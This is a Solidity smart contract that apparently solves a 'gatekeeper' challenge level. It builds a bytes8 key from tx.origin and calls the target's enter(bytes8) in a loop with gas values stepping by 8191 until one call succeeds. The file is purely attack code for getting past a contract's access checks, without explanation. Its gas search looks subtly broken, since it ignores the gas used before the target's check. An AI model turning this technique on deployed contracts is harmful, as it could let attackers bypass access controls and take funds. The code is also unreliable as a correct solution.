pragma solidity ^0.8.0;
contract GatekeeperAttack {
    address public target;
    
    constructor(address _target) {
        target = _target;
    }
    
    function attack() external {
        uint16 key = uint16(uint160(tx.origin));
        uint64 gateKey = (uint64(1) << 32) | uint64(key);
        bytes8 gateKeyBytes = bytes8(gateKey);
        for (uint i = 8191; i <= 100000; i += 8191) {
            (bool success, ) = target.call{gas: i}(abi.encodeWithSignature("enter(bytes8)", gateKeyBytes));
            if (success) break;
        }
    }
}